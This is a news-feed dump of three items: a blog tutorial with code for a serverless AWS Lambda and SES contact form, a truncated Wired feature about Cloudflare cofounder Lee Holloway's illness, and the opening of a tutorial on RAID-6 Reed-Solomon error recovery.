<p><img src="https://jpomykala.com/assets/2018-08-04/lambda.png" alt="lambda"></p>
<p>Please remember that this is not a step by step tutorial, Iâ€™m describing overall architecture with the code (<em>copy-paste ready</em> certification).
If you have any remarks, write a comment in section below or <a href="https://github.com/jpomykala/jpomykala.github.io/blob/master/_posts/2018-08-04-serverless-contact-form-on-static-page.md">create a Github issue</a>. ðŸ˜‰</p>
<h3 id="requirements">Requirements</h3>
<ul>
<li>minimal knowledge about <a href="https://aws.amazon.com/">Amazon Web Services</a></li>
<li>basic JavaScript skills</li>
</ul>
<h3 id="used-technologies">Used technologies</h3>
<ul>
<li><a href="https://aws.amazon.com/lambda/">Amazon Lambda</a></li>
<li><a href="https://aws.amazon.com/ses/">Amazon SES</a></li>
<li><a href="https://aws.amazon.com/api-gateway/">Amazon API Gateway</a></li>
</ul>
<h3 id="demo">Demo</h3>
<p>Same technique I used in many websites, here is one example.</p>
<p><a href="https://vendingmetrics.com/contact">https://vendingmetrics.com/contact</a></p>
<p>So far I didnâ€™t have any issue with this solution.</p>
<h3 id="build-environment">Build environment</h3>
<p>If you are familiar with used technologies the diagram should be pretty straightforward for you.</p>
<p><img src="https://jpomykala.com/assets/2018-08-04/architecture-diagram.png" alt="aws-lambda-function"></p>
<p>Static web page should be gathering data from contact form, validate and send them using XHR Fetch, jQuery or in
other way to API Gateway by POST method. API Gateway will invoke Lambda function, and the Lambda function will invoke
our JavaScript code where we parse POST request, do some custom logic and call <code>sendEmail(...)</code> on SES service.</p>
<h3 id="0-verify-e-mail-address">0. Verify e-mail address</h3>
<p>E-mail address verification can be done <a href="https://eu-west-1.console.aws.amazon.com/ses/home?region=eu-west-1#verified-senders-email:">here (eu-west-1)</a></p>
<p><img src="https://jpomykala.com/assets/2018-08-04/ses-verification.png" alt="ses-verification"></p>
<h3 id="1-lambda-function">1. Lambda Function</h3>
<p>We will start with creating Lambda function and choosing NodeJS 8.1 environment.</p>
<p><a href="https://gist.github.com/jpomykala/a3548903e3454f7d65443053ec412b65">The full code can be found on GitHub Gist</a></p>
<h6 id="import-aws-sdk">import <code>aws-sdk</code></h6>
<p>When we have prepared environment we can start to implement the function. First important thing is that we need to import <code>aws-sdk</code> to use SES and other Amazon services.</p>
<figure><pre><code data-lang="javascript"><span>var</span> <span>aws</span> <span>=</span> <span>require</span><span>(</span><span>"</span><span>aws-sdk</span><span>"</span><span>);</span></code></pre></figure>
<p><a href="https://docs.aws.amazon.com/sdk-for-javascript/index.html">Link to <code>aws-sdk</code> documentation</a></p>
<h6 id="lambda-responses">Lambda responses</h6>
<p>Success and error responses. This part is more important than you think. If we return wrong JSON from lambda function to API Gateway,
the client (contact form in this case) will get HTTP 500 status. Code will be invoked and email sent anyway, but itâ€™s just a good practise to
follow the documentation.</p>
<figure><pre><code data-lang="javascript"><span>const</span> <span>successResponse</span> <span>=</span> <span>{</span>
    <span>"</span><span>statusCode</span><span>"</span><span>:</span> <span>200</span><span>,</span>
    <span>"</span><span>headers</span><span>"</span><span>:</span> <span>{</span>
        <span>"</span><span>Content-Type</span><span>"</span><span>:</span> <span>"</span><span>application/json</span><span>"</span><span>,</span>
    <span>},</span>
    <span>"</span><span>body</span><span>"</span><span>:</span> <span>JSON</span><span>.</span><span>stringify</span><span>({</span> <span>message</span><span>:</span> <span>"</span><span>:)</span><span>"</span> <span>}),</span>
    <span>"</span><span>isBase64Encoded</span><span>"</span><span>:</span> <span>false</span>
<span>};</span>

<span>const</span> <span>errorResponse</span> <span>=</span> <span>{</span>
    <span>"</span><span>statusCode</span><span>"</span><span>:</span> <span>500</span><span>,</span>
    <span>"</span><span>headers</span><span>"</span><span>:</span> <span>{</span>
        <span>"</span><span>Content-Type</span><span>"</span><span>:</span> <span>"</span><span>application/json</span><span>"</span><span>,</span>
    <span>},</span>
    <span>"</span><span>body</span><span>"</span><span>:</span> <span>JSON</span><span>.</span><span>stringify</span><span>({</span> <span>message</span><span>:</span> <span>"</span><span>something bad happen, check logs</span><span>"</span> <span>}),</span>
    <span>"</span><span>isBase64Encoded</span><span>"</span><span>:</span> <span>false</span>
<span>};</span></code></pre></figure>
<h6 id="check-is-domain-allowed">Check is domain allowed</h6>
<p>By using this function we can easily turn on and off e-mail sending from certain domains.</p>
<figure><pre><code data-lang="javascript"><span>const</span> <span>extractDomain</span> <span>=</span> <span>(</span><span>emailAddress</span><span>)</span> <span>=&gt;</span> <span>{</span>
    <span>const</span> <span>emailSplit</span> <span>=</span> <span>emailAddress</span><span>.</span><span>split</span><span>(</span><span>'</span><span>@</span><span>'</span><span>);</span>
    <span>const</span> <span>arraySize</span> <span>=</span> <span>emailSplit</span><span>.</span><span>length</span><span>;</span>
    <span>if</span><span>(</span><span>arraySize</span> <span>&lt;</span> <span>2</span><span>){</span>
        <span>console</span><span>.</span><span>warn</span><span>(</span><span>"</span><span>Domain not found for email:</span><span>"</span><span>,</span> <span>emailAddress</span><span>);</span>
        <span>return</span> <span>""</span><span>;</span>
    <span>}</span>
    
    <span>return</span> <span>emailSplit</span><span>[</span><span>arraySize</span> <span>-</span> <span>1</span><span>];</span>
<span>}</span>

 <span>const</span> <span>allowedDomains</span> <span>=</span> <span>[</span><span>'</span><span>example.com</span><span>'</span><span>,</span> <span>'</span><span>jpomykala.me</span><span>'</span><span>,</span> <span>'</span><span>yourdomain.com</span><span>'</span><span>];</span>
 <span>const</span> <span>isDomainAllowed</span> <span>=</span> <span>(</span><span>domain</span><span>)</span> <span>=&gt;</span> <span>allowedDomains</span><span>.</span><span>includes</span><span>(</span><span>domain</span><span>);</span></code></pre></figure>
<h6 id="e-mail-message">E-mail message</h6>
<p>This is a true strength of this solution. We are passing whole Javascript object from contact form to e-mail formatted
with <code>&lt;pre&gt;&lt;/pre&gt;</code> tags and <code>JSON.stringify</code>.</p>
<figure><pre><code data-lang="javascript"><span>const</span> <span>getEmailMessage</span> <span>=</span> <span>(</span><span>request</span><span>)</span> <span>=&gt;</span> <span>{</span>
    <span>return</span> <span>{</span>
        <span>Body</span><span>:</span> <span>{</span>
            <span>Html</span><span>:</span> <span>{</span>
                <span>Charset</span><span>:</span> <span>"</span><span>UTF-8</span><span>"</span><span>,</span>
                <span>Data</span><span>:</span> <span>`
                    &lt;body&gt;
                    &lt;p&gt;</span><span>${</span><span>request</span><span>.</span><span>message</span><span>}</span><span>&lt;/p&gt;
                    &lt;pre&gt;</span><span>${</span><span>JSON</span><span>.</span><span>stringify</span><span>(</span><span>request</span><span>,</span> <span>undefined</span><span>,</span> <span>2</span><span>)}</span><span>&lt;/pre&gt;
                    &lt;/body&gt;
                    `</span>
            <span>}</span>
        <span>},</span>
        <span>Subject</span><span>:</span> <span>{</span>
            <span>Charset</span><span>:</span> <span>"</span><span>UTF-8</span><span>"</span><span>,</span>
            <span>Data</span><span>:</span> <span>`New submission`</span>
        <span>}</span>
    <span>}</span>
<span>}</span></code></pre></figure>
<h6 id="send-e-mail-by-ses">Send e-mail by SES</h6>
<p>The most important part of this function is of course sending email by SES. We create a params with message,
subject and <a href="https://docs.aws.amazon.com/AWSJavaScriptSDK/latest/AWS/SES.html">all other options which can be found here.</a></p>
<figure><pre><code data-lang="javascript"> <span>const</span> <span>params</span> <span>=</span> <span>{</span>
        <span>Destination</span><span>:</span> <span>{</span>
            <span>ToAddresses</span><span>:</span> <span>[</span><span>sendToEmail</span><span>]</span>
        <span>},</span>
        <span>Message</span><span>:</span> <span>emailMessage</span><span>,</span>
        <span>Source</span><span>:</span> <span>`</span><span>${</span><span>request</span><span>.</span><span>name</span> <span>||</span> <span>"</span><span>Unknown</span><span>"</span><span>}</span><span> &lt;<a href="https://jpomykala.com/cdn-cgi/l/email-protection" data-cfemail="41382e34331e37243328272824251e242c20282d1e282f1e32243201262c20282d6f222e2c">[email&nbsp;protected]</a>&gt;`</span><span>,</span>
        <span>ReplyToAddresses</span><span>:</span> <span>[</span><span>request</span><span>.</span><span>_replyTo</span><span>]</span>
    <span>};</span>


    <span>const</span> <span>sendPromise</span> <span>=</span> <span>new</span> <span>aws</span><span>.</span><span>SES</span><span>()</span>
        <span>.</span><span>sendEmail</span><span>(</span><span>params</span><span>)</span>
        <span>.</span><span>promise</span><span>();</span>

    <span>await</span> <span>sendPromise</span>
        <span>.</span><span>then</span><span>(</span><span>data</span> <span>=&gt;</span> <span>{</span>
            <span>console</span><span>.</span><span>log</span><span>(</span><span>`E-mail sent to </span><span>${</span><span>sendToEmail</span><span>}</span><span>`</span><span>);</span>
            <span>console</span><span>.</span><span>log</span><span>(</span><span>successResponse</span><span>);</span>
            <span>callback</span><span>(</span><span>null</span><span>,</span> <span>successResponse</span><span>);</span>
        <span>})</span>
        <span>.</span><span>catch</span><span>(</span><span>err</span> <span>=&gt;</span> <span>{</span>
            <span>console</span><span>.</span><span>log</span><span>(</span><span>"</span><span>E-mail NOT sent</span><span>"</span><span>,</span> <span>err</span><span>);</span>
            <span>console</span><span>.</span><span>log</span><span>(</span><span>errorResponse</span><span>);</span>
            <span>callback</span><span>(</span><span>errorResponse</span><span>);</span>
        <span>});</span></code></pre></figure>
<p>Now we can deploy our function and move to API Gateway.</p>
<p><img src="https://jpomykala.com/assets/2018-08-04/send-mail-fuction-aws.png" alt="aws-lambda-function"></p>
<h3 id="2-api-gateway">2. API Gateway</h3>
<p>Setting up API Gateway for Lambda functions, should be straightforward. There is no need to code any thing, just click-and-play configuration.
In this case I setup my endpoint to receive any http method. For working contact form you will need only <code>http/post</code> method.
<img src="https://jpomykala.com/assets/2018-08-04/api-gateway.png" alt="api-gateway"></p>
<h6 id="things-to-remember">Things to remember</h6>
<ul>
<li>Every time we change something on endpoint configuration we need deploy API again to see changes. <code>Actions -&gt; Deploy API</code></li>
<li>Remember about setting up CORS while using API Gateway. <code>Actions -&gt; Enable CORS</code></li>
</ul>
<h3 id="3-contact-form-example">3. Contact form example</h3>
<h6 id="html-form">HTML form</h6>
<figure><pre><code data-lang="html"><span>&lt;form</span> <span>action=</span><span>"#"</span> <span>id=</span><span>"callbackForm"</span> <span>class=</span><span>"contact-form"</span><span>&gt;</span>
    <span>&lt;div</span> <span>class=</span><span>"form-group"</span><span>&gt;</span>
        <span>&lt;label</span> <span>for=</span><span>"email"</span><span>&gt;</span>Email<span>&lt;/label&gt;</span>
        <span>&lt;input</span> <span>type=</span><span>"email"</span> <span>required</span> <span>id=</span><span>"email"</span> <span>class=</span><span>"form-control"</span> <span>placeholder=</span><span>""</span> <span>autocomplete=</span><span>"email"</span> <span>name=</span><span>"email"</span> <span>/&gt;</span>
    <span>&lt;/div&gt;</span>
    <span>&lt;div</span> <span>class=</span><span>"form-group"</span><span>&gt;</span>
        <span>&lt;label</span> <span>for=</span><span>"name"</span><span>&gt;</span>Message<span>&lt;/label&gt;</span>
        <span>&lt;input</span> <span>id=</span><span>"message"</span> <span>type=</span><span>"text"</span> <span>class=</span><span>"form-control"</span> <span>placeholder=</span><span>""</span> <span>name=</span><span>"message"</span> <span>/&gt;</span>
    <span>&lt;/div&gt;</span>
    <span>&lt;button</span> <span>type=</span><span>"submit"</span> <span>id=</span><span>"sendMessageButton"</span> <span>class=</span><span>"btn btn-primary btn-block"</span><span>&gt;</span>
        Send message
    <span>&lt;/button&gt;</span>
<span>&lt;/form&gt;</span></code></pre></figure>
<h6 id="javascript">JavaScript</h6>
<figure><pre><code data-lang="html"><span>&lt;script&gt;</span>
        <span>$</span><span>(</span><span>"</span><span>#callbackForm</span><span>"</span><span>).</span><span>submit</span><span>(</span><span>function</span><span>(</span><span>e</span><span>)</span> <span>{</span>
            <span>e</span><span>.</span><span>preventDefault</span><span>();</span>
            <span>var</span> <span>replyTo</span> <span>=</span> <span>$</span><span>(</span><span>"</span><span>#email</span><span>"</span><span>);</span>
            <span>var</span> <span>message</span> <span>=</span> <span>$</span><span>(</span><span>"</span><span>#message</span><span>"</span><span>);</span>
            <span>var</span> <span>data</span> <span>=</span> <span>{</span>
                <span>"</span><span>_sendTo</span><span>"</span><span>:</span> <span>"</span><span>&lt;your_email&gt;</span><span>"</span><span>,</span>
                <span>"</span><span>_replyTo</span><span>"</span><span>:</span> <span>replyTo</span><span>.</span><span>val</span><span>(),</span>
                <span>"</span><span>message</span><span>"</span><span>:</span> <span>message</span><span>.</span><span>val</span><span>()</span>
            <span>};</span>
            <span>var</span> <span>url</span> <span>=</span> <span>"</span><span>&lt;API_GATEWAY_URL&gt;</span><span>"</span><span>;</span>
            <span>$</span><span>.</span><span>ajax</span><span>({</span>
                <span>url</span><span>:</span> <span>url</span><span>,</span>
                <span>type</span><span>:</span> <span>'</span><span>POST</span><span>'</span><span>,</span>
                <span>crossDomain</span><span>:</span> <span>true</span><span>,</span>
                <span>data</span><span>:</span> <span>JSON</span><span>.</span><span>stringify</span><span>(</span><span>data</span><span>),</span>
                <span>dataType</span><span>:</span> <span>'</span><span>json</span><span>'</span><span>,</span>
                <span>contentType</span><span>:</span> <span>"</span><span>application/json</span><span>"</span>
            <span>});</span>
        <span>});</span>
<span>&lt;/script&gt;</span></code></pre></figure>
<h3 id="conclusion">Conclusion</h3>
<p>We can scale this technique to multiple web pages with ease, but this solution in current form has few downsides.
For now the only one protection against DDoS or some similar attack is rate limiter included in Lambda function.
Right now there is no bot protection, no captcha or something like that. We can add Google re-captcha on the contact
form and setup rate limiting on both API Gateway and Lambda function, to avoid unnecessary costs.</p>
</div></div>]]>
            </description>
            <link>https://jpomykala.com/2018/08/04/serverless-contact-form-on-static-page</link>
            <guid isPermaLink="false">hacker-news-small-sites-25666891</guid>
            <pubDate>Thu, 07 Jan 2021 03:22:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Devastating Decline of a Brilliant Young Coder]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25666855">thread link</a>) | @mraza007
<br/>
January 6, 2021 | https://weekly.statuscode.com/link/100809/ac1fb866f8 | <a href="https://web.archive.org/web/*/https://weekly.statuscode.com/link/100809/ac1fb866f8">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><figure><div></div></figure><p><span>On Friday, September</span> 13, 2019, Matthew Prince and Michelle Zatlyn, cofounders of the San Francisco  <a href="https://www.wired.com/tag/cloudflare/">internet security firm Cloudflare</a>, stood on a slim marble balcony overlooking the floor of the New York Stock Exchange. A cluster of the company's executives stood near Prince, ready to shout out a countdown. “Louder! Loud!” Prince urged them. “Five! Four! Three! …” At 9:30 am sharp, the founders reached down to ring the exchange's famous bell, kicking off the day's trading and offering their 10-year-old company on the public market. It was a rite of passage and also their payday, a moment that unlocked many millions of dollars in newfound wealth.</p><p>More than 100 employees and investors cheered from the trading floor below, their phones held high to capture the scene. Kristin Holloway, employee number 11, looked up at the balcony and snapped photos, then popped them into a text to her husband, Lee Holloway, the company's third cofounder. He was home in California. Every so often, a familiar face pushed through the throng to say to her, “Lee should be here.”</p><p>In Cloudflare's early years, Lee Holloway had been the resident genius, the guy who could focus for hours, code pouring from his fingertips while death metal blasted in his headphones. He was the master architect whose vision had guided what began as a literal sketch on a napkin into a tech giant with some 1,200 employees and 83,000 paying customers. He laid the groundwork for a system that now handles more than 10 percent of all internet requests and <a href="https://www.wired.com/story/cloudflare-matthew-prince-wired25/">blocks billions of cyberthreats</a> per day. Much of the architecture he dreamed up is still in place.</p><p>But some years before the IPO, his behavior began to change. He lost interest in his projects and coworkers. He stopped paying attention in meetings. His colleagues noticed he was growing increasingly rigid and belligerent, resisting others' ideas, and ignoring their feedback.</p><p>Lee's rudeness perplexed his old friends. He had built his life around Cloudflare, once vowing to not cut his hair until the startup's web traffic surpassed that of Yahoo. (It took a few short months, or about 4 inches of hair.) He had always been easygoing, happy to mentor his colleagues or hang out over lunch. At a birthday party for Zatlyn, he enchanted some children, regaling them with stories about the joys of coding. The idea of Lee picking fights simply didn't compute.</p></div></div><div><div><p>He was becoming erratic in other ways too. Some of his colleagues were surprised when Lee separated from his first wife and soon after paired up with a coworker. They figured his enormous success and wealth must have gone to his head. “All of us were just thinking he made a bunch of money, married his new girl,” Prince says. “He kind of reassessed his life and had just become a jerk.”</p><p>The people close to Lee felt tossed aside. They thought he'd chosen to shed his old life. In fact, it was anything but a choice. Over the next few years, Lee's personality would warp and twist even more, until he became almost unrecognizable to the people who knew him best. Rooting out the cause took years of detective work—and forced his family to confront the trickiest questions of selfhood.</p><p>On the floor of the stock exchange that September morning, Lee's younger brother Alaric weathered the morning in a state of low-grade panic. He snapped selfies with early employees and fired them off in texts to his brother. Alaric had never worked at Cloudflare, and he knew barely anyone there. But his dark hair flopped over his forehead with the same distinctive swoop as his brother's, and his long, tapering face had the same dark eyes and olive skin. “It was surreal,” Alaric says. “People kept looking at me like they knew me.”</p><p>At home with his parents in San Jose, Lee, 38, was restless. He paced the rooms and hallways of the 1,550-square-foot house, a loop he'd been tracing since he'd moved in with them two years earlier. He didn't speak. His parents had the TV on, and they called him over whenever Prince or Zatlyn appeared onscreen.</p><p>Later, he paused at the family's Roku to search YouTube for videos of Cloudflare. Then he resumed his circuit: walking the halls, buzzing his lips, snacking on cashews.</p><figure><figcaption><span>Lee Holloway spends time with his youngest son at home on California's Central Coast.</span><span>Artwork by Amy Friend; Photograph by Jack Bool</span></figcaption></figure><p><span>What makes you</span>  <em>you</em>? The question cuts to the core of who we are, the things that make us special in this universe. The converse of the question raises another kind of philosophical dilemma: If a person <em>isn't</em> himself, who is he?</p><p>Countless philosophers have taken a swing at this elusive piñata. In the 17th century, John Locke pinned selfhood <a href="https://www.wired.com/tag/memory/">on memory</a>, using recollections as the thread connecting a person's past with their present. That holds some intuitive appeal: Memory, after all, is how most of us register our continued existence. But memory is unreliable. Writing in the 1970s, renowned philosopher Derek Parfit recast Locke's idea to argue that personhood emerges from a more complex view of psychological connectedness across time. He suggested that a host of mental phenomena—memories, intentions, beliefs, and so on—forge chains that bind us to our past selves. A person today has many of the same psychological states as that person a day ago. Yesterday's human enjoys similar overlap with an individual of two days prior. Each memory or belief is a chain that stretches back through time, holding a person together in the face of inevitable flux.</p></div></div><div><div><p>The gist, then, is that someone is “himself” because countless mental artifacts stay firm from one day to the next, anchoring that person's character over time. It's a less crisp definition than the old idea of a soul, offering no firm threshold where selfhood breaks down. It doesn't pinpoint, for example, how many psychological chains you can lose before you stop being yourself. <a href="https://www.wired.com/tag/neuroscience/">Neuroscience</a> also offers only a partial answer to the question of what makes you <em>you</em>.</p><p><a href="https://www.wired.com/tag/neural-networks/">Neural networks</a> encode our mental artifacts, which together form the foundation of behavior. A stimulus enters the brain, and electrochemical signals swoosh through your neurons, culminating in an action: Hug a friend. Sit and brood. Tilt your head up at the sun and smile. Losing some brain cells here or there is no big deal; the networks are resilient enough to keep a person's behaviors and sense of self consistent.</p><p>But not always. Mess with the biological Jell-O in just the right ways and the structure of the self reveals its fragility.</p><p>Lee's personality had been consistent for decades—until it wasn't.</p><p>From an early age, he was a person who could visualize sprawling structures in his mind. Growing up in the 1990s in Cupertino, where his dad worked at Apple, Lee had early access to the latest computers, and he and his brother grew up bingeing on videogames. As a gamer, he was legendary among his friends for being able to read a complex situation, rapidly adjust strategies, and win match after match. And it wasn't just videogames. His childhood friend Justin Powell remembers Lee strolling into a middle school chess club tournament cold. He wasn't a member of the club, but he won the tournament anyway. Lee avoided becoming insufferable by channeling his wit into snarky commentary. “Watching a movie with him was like a version of <em>Mystery Science Theater 3000</em>,” Powell says. “His very presence challenged you to keep up with him.”</p><p>Lee and his friends would cart their computers to each other's houses to play games together. He became curious about the machines themselves and started learning computer science, first in high school, then at a local community college and UC Santa Cruz, where an unlikely set of circumstances connected him with Matthew Prince.</p><p>Then a young entrepreneur, Prince was pursuing an idea for an antispam software tool when he encountered Arthur Keller, a UC Santa Cruz computer science professor. Keller and his students had already worked out a very similar concept. Prince and Keller agreed to share a patent, along with Keller's students. One of those students was Lee, and Prince hired him on the spot. “I had no idea this school project would turn into something much bigger,” Lee later said in a video interview with a group called Founderly.</p><p>Prince set up the company, Unspam Technologies, in Park City, Utah, about a mile from a cluster of slopes where he could indulge his passion for skiing. Lee moved into Prince's basement, at first working for free in exchange for food and housing. But Lee and the other Unspam engineers grew restless, and they started spinning up side projects, including one called Project Honey Pot, which tracked spammers as they crawled the web. That's all it did—it collected and published data on spammers, but it didn't do anything to stop them. Still, the project quickly amassed a loyal following.</p><p>In 2007, Prince left Utah to start business school at Harvard, and Lee moved to California to live with his girlfriend, Alexandra Carey. They'd known each other as undergrads, when she was a teaching assistant in his computer architecture class. Lee had goofed off in that class, once pranking the professor by scrawling childish notes on the transparencies of an overhead projector. Alexandra had been amused, but it wasn't until after college that a relationship bloomed. Living in different cities, they fell for each other while playing and chatting within a multiplayer videogame called <em>Savage</em>. Now, with Prince leaving Utah, it seemed a natural time for Lee to join Alexandra. They married in 2008.</p><div><div><p><span><picture><img alt="This image may contain Electronics, Computer, and Pc" src="https://media.wired.com/photos/5c098e5fd146d62d209935fc/1:1/w_775%2Cc_limit/Data-Breaches.png" srcset="https://media.wired.com/photos/5c098e5fd146d62d209935fc/1:1/w_775%2Cc_limit/Data-Breaches.png 775w, https://media.wired.com/photos/5c098e5fd146d62d209935fc/1:1/w_775%2Cc_limit/Data-Breaches.png 775w, https://media.wired.com/photos/5c098e5fd146d62d209935fc/1:1/w_768%2Cc_limit/Data-Breaches.png 768w, https://media.wired.com/photos/5c098e5fd146d62d209935fc/1:1/w_768%2Cc_limit/Data-Breaches.png 768w, https://media.wired.com/photos/5c098e5fd146d62d209935fc/1:1/w_640%2Cc_limit/Data-Breaches.png 640w" sizes="100vw"></picture></span></p><div><h3><a href="https://weekly.statuscode.com/story/wired-guide-to-data-breaches">The WIRED Guide to Data Breaches</a></h3><p>Everything you ever wanted to know about Equifax, Mariott, and the problem with social security numbers.</p></div></div></div><p>Lee and Prince kept working at Unspam from their respective cities, but as Prince was wrapping up business school, Lee called to tell him he was considering other job offers. Prince countered with a new and rather audacious pitch: He and a classmate, Michelle Zatlyn, had hit on a startup idea they thought had potential. What if they …</p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://weekly.statuscode.com/link/100809/ac1fb866f8">https://weekly.statuscode.com/link/100809/ac1fb866f8</a></em></p>]]>
            </description>
            <link>https://weekly.statuscode.com/link/100809/ac1fb866f8</link>
            <guid isPermaLink="false">hacker-news-small-sites-25666855</guid>
            <pubDate>Thu, 07 Jan 2021 03:16:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Reed-Solomon error recovery in RAID-6]]>
            </title>
            <description>
<![CDATA[
Score 100 | Comments 37 (<a href="https://news.ycombinator.com/item?id=25666830">thread link</a>) | @signa11
<br/>
January 6, 2021 | http://anadoxin.org/blog/error-recovery-in-raid6.html/ | <a href="https://web.archive.org/web/*/http://anadoxin.org/blog/error-recovery-in-raid6.html/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        

        

        <p>
            <h3>Reed-Solomon error recovery in RAID-6</h3>
        </p>

        <p>
            https://anadoxin.org/blog/error-recovery-in-raid6.html
        </p>

        
        
        
        

        
        
        
        

        
        <p>There are lots of resources on the Internet about RAID-6 error recovery and how you can create your own implementation of it, but most of those resources require spending a lot of time fighting with mathematical equations and figuring out the real algorithm.</p>
<p>In this post I'll try to give you a simple example how you can create your own error recovery solution based on what is used in RAID-6. More specifically, if you need to provide rendundancy across your mediums so that a failure of 1 or 2 mediums will be tolerated, look no further! ;)</p>
<p>If you'll read this post, as a bonus you'll gain knowledge about how RAID-5 error recovery works, because RAID-6 is an improved version of RAID-5 error recovery system.</p>

<p>Let's assume you have 3 disk drives with some data. Let's name those drives as <code>D1</code>, <code>D2</code> and <code>D3</code>. In order to use the same error recovery technique as RAID-6 uses, you'll need two additional disk drives, the <code>PD</code> drive, and the <code>RS</code> drive. I'll describe what <code>PD</code> and <code>RS</code> means in few moments. So, you'll need a total of 5 disk drives: <code>D1</code>, <code>D2</code>, <code>D3</code>, <code>PD</code> and <code>RS</code>.</p>
<p><img src="https://anadoxin.org/blog/error-recovery-in-raid6.html/image1.svg" alt=""></p>
<p>So, here's the situation:</p>
<ul>
<li><code>D1</code>, <code>D2</code> and <code>D3</code> contain <em>arbitrary user data</em>, and it doesn't matter what their contents are. FWIW you can assume those drives are full of cat pictures.</li>
<li>The special <code>PD</code> drive (named after <code>Parity Drive</code>, sometimes called <code>P</code> in whitepapers) contains the XOR data, generated automatically from <code>D1</code>, <code>D2</code> and <code>D3</code>.</li>
<li>The second special <code>RS</code> drive (named after <code>Reed-Solomon Drive</code>, sometimes also called <code>Q</code>) contains the Reed-Solomon codes, calculated from the same data as <code>PD</code>, namely from drives <code>D1</code>, <code>D2</code> and <code>D3</code>.</li>
</ul>
<p>Let's see how we can perform some basic operations on such disk array.</p>

<p>If we have properly calculated <code>PD</code> and <code>RS</code> drives, we can lose up to 2 drives. How we recover from failures depends on which drives will fail. There are generally 7 cases that RAID-6 can handle. Next points will describe the scenarios, sorted from the easiest case, to the most complicated.</p>
<ol>
<li>
<p>Loss of the <code>PD</code> drive (failure of only one drive).</p>
<p><img src="https://anadoxin.org/blog/error-recovery-in-raid6.html/image-losspd.svg" alt=""></p>
<p>This case is very straightforward. The <code>PD</code> drive contains only autogenerated data, so in case we lose the <code>PD</code> drive, we can regenerate it by using only user data (stored on disks <code>D1</code>, <code>D2</code> and <code>D3</code>).</p>
</li>
<li>
<p>Loss of one of the data drives: either <code>D1</code>, <code>D2</code> or <code>D3</code> (failure of only one drive).</p>
<p><img src="https://anadoxin.org/blog/error-recovery-in-raid6.html/image-datadrive.svg" alt=""></p>
<p>In this case we're losing data, but since we only lose 1 disk, the recovery scenario is the same as in RAID-5 error recovery: we'll use <code>PD</code> drive <em>together with two non-missing data drives</em> to recover data from the missing data drive. It doesn't matter which data drive we lose, because if we have 2 data drives and the <code>PD</code> drive, we can always generate data for the third drive. The <code>RS</code> drive is not needed to regenerate the data drive in this case (and is not used at all in this failure case).</p>
</li>
<li>
<p>Loss of the <code>RS</code> drive (failure of only one drive).</p>
<p><img src="https://anadoxin.org/blog/error-recovery-in-raid6.html/image-lossrs.svg" alt=""></p>
<p>Similar to the situation from point 1: we have all the data drives, and we can simply regenerate the <code>RS</code> drive by calculating Reed-Solomon codes from drives that did not fail.</p>
</li>
<li>
<p>Loss of the <code>PD</code> drive and the <code>RS</code> drive (failure of two drives).</p>
<p><img src="https://anadoxin.org/blog/error-recovery-in-raid6.html/image-losspdrs.svg" alt=""></p>
<p>This case is very similar to points 1 or 3, we have all the data intact, so we can generate contents of <code>PD</code> drive and then <code>RS</code> drive very easily.</p>
</li>
<li>
<p>Loss of the <code>RS</code> drive and one data drive (failure of two drives).</p>
<p><img src="https://anadoxin.org/blog/error-recovery-in-raid6.html/image-lossdatars.svg" alt=""></p>
<p>In this case we're losing two disks, but only one lost disk is filled with data. Since we have <code>PD</code> drive intact, we can use it to regenerate data from missing data drive, so this case is not so different than case #2. After that, we will have all the data drives, so we can regenerate the <code>RS</code> drive easily.</p>
</li>
<li>
<p>Loss of the <code>PD</code> drive and one data drive (failure of two drives).</p>
<p><img src="https://anadoxin.org/blog/error-recovery-in-raid6.html/image-lossdatapd.svg" alt=""></p>
<p>This case is more complicated. We lose one user data drive (in this example <code>D3</code>), and we don't have the <code>PD</code> drive to aid with recovery, because we've lost it as well. We have to use the <code>RS</code> drive in conjunction with all user data drives that are still available (<code>D1</code> and <code>D2</code>) to regenerate the missing data drive <code>D3</code>. After we'll have all data drives regenerated, we can calculate the missing <code>PD</code> drive. This is the first case where recovery using Reed-Solomon codes comes into play.</p>
</li>
<li>
<p>Loss of two data drives (failure of two drives).</p>
<p><img src="https://anadoxin.org/blog/error-recovery-in-raid6.html/image-lossdatadata.svg" alt=""></p>
<p>This is the most complicated scenario. We need to use both <code>PD</code> and <code>RS</code> to regenerate both data drives. Reed-Solomon coding makes this case possible.</p>
</li>
</ol>
<p>In the following sections, I'll try to describe those cases above with more detail, and provide some source code (in Python :P) that will perform actual recovery of data.</p>
<p>Please keep in mind that real RAID-6 arrays don't really dedicate whole disk for <code>PD</code> or <code>RS</code>. Real arrays span this additional checksum data across all disks. There are multiple methods used by various controllers: left asynchronous, right synchronous, there can be an offset to the RAID data, there can be pattern delays, etc. Why it's done this way, and how exactly RAID-6 stripes looks like is beyond the scope of this blog post. So let's stick only to Reed-Solomon codes.</p>
<h2 id="test-data">Test data</h2>
<p>Let's define how our "user data" looks like. To keep things simple, let's pretend that our "disk drives" are 5 bytes big.</p>
<table><thead><tr><th>Disk</th><th>Data in ASCII</th><th>Data in HEX</th></tr></thead><tbody>
<tr><td><code>D1</code></td><td>f i r s t</td><td>0x66, 0x69, 0x72, 0x73, 0x74</td></tr>
<tr><td><code>D2</code></td><td>s e c n d</td><td>0x73, 0x65, 0x63, 0x6e, 0x64</td></tr>
<tr><td><code>D3</code></td><td>t h i r d</td><td>0x74, 0x68, 0x69, 0x72, 0x64</td></tr>
</tbody></table>
<p>Let's go into the scenarios mentioned above in more details.</p>

<p>In order to generate the <code>PD</code> data, we need only the user data drives. In our case it's <code>D1</code>, <code>D2</code> and <code>D3</code>. The <code>PD</code> drive consists of nothing more than <a href="https://en.wikipedia.org/wiki/Bitwise_operation#XOR">XOR</a> of all user data.</p>
<ul>
<li>To generate offset 0 of the <code>PD</code> drive, you need to XOR all bytes from offset 0 from all disk drives.</li>
<li>Then, to generate offset 1 of the <code>PD</code> drive, you need to XOR bytes from offset 1 from all disk drives. E.g.:</li>
</ul>
<pre><code><span>PD[0] = D1[0] xor D2[0] xor D3[0]
PD[1] = D1[1] xor D2[1] xor D3[1]
